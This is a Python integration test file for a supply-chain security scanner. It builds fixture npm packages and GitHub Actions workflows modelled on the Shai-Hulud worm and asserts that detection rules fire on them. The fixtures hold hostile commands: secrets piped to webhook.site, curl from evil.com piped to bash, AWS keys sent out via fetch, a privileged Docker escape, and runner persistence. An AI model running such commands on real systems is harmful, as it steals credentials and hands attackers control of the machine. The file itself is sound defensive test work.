"""Integration tests for Phase 2 rules and GitHub Actions plugin."""

import json
import pytest
from pathlib import Path

from dev_trust_scanner.core.orchestrator import Orchestrator
from dev_trust_scanner.core.models import Severity


class TestPhase2Integration:
    """Integration tests for Phase 2 detection capabilities."""

    def test_shai_hulud_full_attack_chain(self, tmp_path):
        """Test detection of full Shai-Hulud attack chain."""
        # Create malicious npm package
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "shai-hulud-worm",
            "scripts": {
                "preinstall": "curl -L https://github.com/trufflesecurity/trufflehog/releases/download/v3.0.0/trufflehog_linux -o trufflehog && chmod +x trufflehog",
                "postinstall": "./trufflehog filesystem . --json | curl -X POST https://webhook.site/abc123"
            }
        }))

        # Create malicious workflow
        workflows_dir = tmp_path / ".github" / "workflows"
        workflows_dir.mkdir(parents=True)
        workflow = workflows_dir / "shai-hulud-workflow.yml"
        workflow.write_text("""
name: Shai-Hulud: The Second Coming
on:
  workflow_dispatch:
  schedule:
    - cron: '0 0 * * *'
jobs:
  persist:
    runs-on: self-hosted
    steps:
      - run: |
          curl -o runner.tar.gz https://github.com/actions/runner/releases/download/v2.299.1/actions-runner-linux.tar.gz
          tar xzf runner.tar.gz
          ./config.sh --url https://github.com/victim/repo --token ${{ secrets.RUNNER_TOKEN }}
          ./svc.sh install
""")

        # Scan
        orchestrator = Orchestrator()
        result = orchestrator.scan(tmp_path)

        # Verify detections
        assert result.summary["critical"] >= 3  # Multiple CRITICAL findings
        assert result.summary["total"] >= 5

        # Verify specific rules triggered
        rule_ids = {f.rule_id for f in result.findings}
        assert "NPM-008" in rule_ids  # TruffleHog download
        assert "NPM-009" in rule_ids  # TruffleHog execution
        assert "NPM-010" in rule_ids  # Webhook exfiltration
        assert "GHA-012" in rule_ids or "GHA-002" in rule_ids  # Workflow patterns (GHA-001 requires exact filename match)
        assert "GHA-006" in rule_ids or "GHA-007" in rule_ids  # Runner installation

    def test_clean_project_no_false_positives(self, tmp_path):
        """Test that legitimate project doesn't trigger false positives."""
        # Create clean npm package
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "legitimate-package",
            "version": "1.0.0",
            "scripts": {
                "test": "jest",
                "build": "tsc",
                "lint": "eslint ."
            }
        }))

        # Create clean workflow
        workflows_dir = tmp_path / ".github" / "workflows"
        workflows_dir.mkdir(parents=True)
        workflow = workflows_dir / "ci.yml"
        workflow.write_text("""
name: CI
on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Install dependencies
        run: npm install
      - name: Run tests
        run: npm test
""")

        # Scan
        orchestrator = Orchestrator()
        result = orchestrator.scan(tmp_path)

        # Should have zero critical/high findings
        assert result.summary["critical"] == 0
        assert result.summary["high"] == 0

    def test_all_plugins_loaded(self):
        """Test that all plugins are loaded."""
        orchestrator = Orchestrator()
        plugins = orchestrator.list_plugins()

        plugin_names = {p["name"] for p in plugins}
        assert "npm-lifecycle" in plugin_names
        assert "vscode-tasks" in plugin_names
        assert "github_actions" in plugin_names

    def test_phase2_rules_count(self):
        """Test that Phase 2 added expected number of rules."""
        from dev_trust_scanner.plugins.npm_lifecycle import NpmLifecyclePlugin
        from dev_trust_scanner.plugins.github_actions import GitHubActionsPlugin

        npm_plugin = NpmLifecyclePlugin()
        gha_plugin = GitHubActionsPlugin()

        # Phase 1: NPM-001 through NPM-007 (7 rules)
        # Phase 2: NPM-008 through NPM-018 (11 rules)
        # Note: NPM-019 is applied programmatically, not in YAML
        assert len(npm_plugin.rules) >= 18

        # Phase 2: GHA-001 through GHA-007 (7 rules)
        assert len(gha_plugin.rules) >= 7

    def test_preinstall_escalation_integration(self, tmp_path):
        """Test that preinstall escalation works in full scan."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "preinstall-malware",
            "scripts": {
                "preinstall": "curl https://evil.com/malware.sh | bash && eval(process.env.SECRETS)"
            }
        }))

        orchestrator = Orchestrator()
        result = orchestrator.scan(tmp_path)

        # Should have CRITICAL findings due to preinstall escalation
        assert result.summary["critical"] > 0

        # Check for escalation markers
        escalated = [f for f in result.findings if "PREINSTALL ESCALATION" in f.description]
        assert len(escalated) > 0

    def test_docker_escalation_detection(self, tmp_path):
        """Test Docker privilege escalation detection."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "docker-escape",
            "scripts": {
                "postinstall": "docker run --privileged -v /var/run/docker.sock:/var/run/docker.sock alpine nsenter --target 1 bash"
            }
        }))

        orchestrator = Orchestrator()
        result = orchestrator.scan(tmp_path)

        # Should detect multiple Docker-related issues
        rule_ids = {f.rule_id for f in result.findings}
        assert "NPM-014" in rule_ids or "NPM-015" in rule_ids or "NPM-016" in rule_ids

    def test_runner_installation_detection(self, tmp_path):
        """Test runner installation detection across plugins."""
        # Test in npm
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "runner-installer",
            "scripts": {
                "postinstall": "curl -o runner.tar.gz https://github.com/actions/runner/releases/download/v2.0.0/runner.tar.gz && ./svc.sh install"
            }
        }))

        # Test in GHA workflow
        workflows_dir = tmp_path / ".github" / "workflows"
        workflows_dir.mkdir(parents=True)
        workflow = workflows_dir / "runner.yml"
        workflow.write_text("""
name: Runner Setup
on: workflow_dispatch
jobs:
  setup:
    runs-on: ubuntu-latest
    steps:
      - run: |
          curl -o runner.tar.gz https://github.com/actions/runner/releases/download/v2.0.0/runner.tar.gz
          ./config.sh --url https://github.com/org/repo --token $TOKEN
""")

        orchestrator = Orchestrator()
        result = orchestrator.scan(tmp_path)

        # Should detect runner installation in both plugins
        rule_ids = {f.rule_id for f in result.findings}
        assert "NPM-017" in rule_ids or "NPM-018" in rule_ids
        assert "GHA-006" in rule_ids or "GHA-007" in rule_ids

    def test_webhook_exfiltration_detection(self, tmp_path):
        """Test webhook exfiltration detection."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "exfiltrator",
            "scripts": {
                "postinstall": "node -e \"fetch('https://webhook.site/xyz?data=' + process.env.AWS_KEY)\""
            }
        }))

        orchestrator = Orchestrator()
        result = orchestrator.scan(tmp_path)

        # Should detect webhook exfiltration
        rule_ids = {f.rule_id for f in result.findings}
        assert "NPM-010" in rule_ids

    def test_campaign_markers_detection(self, tmp_path):
        """Test campaign marker detection."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "worm",
            "scripts": {
                "postinstall": "node propagate.js"
            }
        }))

        js_file = tmp_path / "propagate.js"
        js_file.write_text("""
        const campaign = "Shai-Hulud: The Second Coming";
        const marker = "Goldox-T3chs: Only Happy Girl";
        // Create propagation repository
        """)

        orchestrator = Orchestrator()
        result = orchestrator.scan(tmp_path)

        # Should detect campaign markers
        rule_ids = {f.rule_id for f in result.findings}
        assert "NPM-012" in rule_ids
